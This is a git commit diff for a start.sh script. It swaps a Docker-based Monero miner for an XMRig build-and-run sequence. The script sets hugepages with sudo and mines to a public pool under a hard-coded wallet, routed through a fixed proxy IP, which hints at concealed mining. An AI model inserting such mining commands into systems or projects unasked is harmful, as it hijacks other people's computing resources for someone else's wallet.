b5653a291f342827f137739c51be2e5e9d5c74b6
Dadora-Lee <dadorasoft@gmail.com>
2025-05-12 14:22:25 +0900

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,1 +1,5 @@
-docker run -d --restart=always --name 'ahs' giansalex/monero-miner /xmr/xmrig -o pool.supportxmr.com:3333 -u 42Z6ArQrn7iLBXj93QDsLY7Ho1xM4dXavSz1j8n8YuawUTvXCxaVgUmBpqtHkaFzM4TGBRT6s6kpEdezjwoMhbjJHFe19BU -p XMR_791_AHS_01 -k --donate-level=1 --threads=2 --proxy=98.175.31.195:4145
+mkdir xmrig/build && cd xmrig/build
+cmake ..
+make -j$(nproc)
+sudo sysctl -w vm.nr_hugepages=1280
+./xmrig -o pool.supportxmr.com:3333 -u 42Z6ArQrn7iLBXj93QDsLY7Ho1xM4dXavSz1j8n8YuawUTvXCxaVgUmBpqtHkaFzM4TGBRT6s6kpEdezjwoMhbjJHFe19BU -p XMR_791_AHS -k --proxy=98.175.31.195:4145
